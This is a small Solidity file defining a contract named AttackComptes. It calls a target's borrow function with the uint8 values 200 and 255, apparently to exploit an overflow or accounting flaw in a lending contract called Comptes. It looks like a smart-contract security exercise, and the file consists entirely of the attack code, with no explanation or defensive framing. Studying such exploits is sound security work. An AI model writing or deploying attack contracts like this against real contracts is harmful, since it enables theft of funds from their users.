// SPDX-License-Identifier: MIT

pragma solidity 0.8.30;

interface IComptes {
    function borrow(uint8 _amount) external;
    function refund() external payable;
}

contract AttackComptes {

    IComptes comptes;

    constructor(IComptes _comptes) {
        comptes = _comptes;
    }

    function attackBorrow() external payable {
        comptes.borrow(200);
        comptes.borrow(255);
    }

}
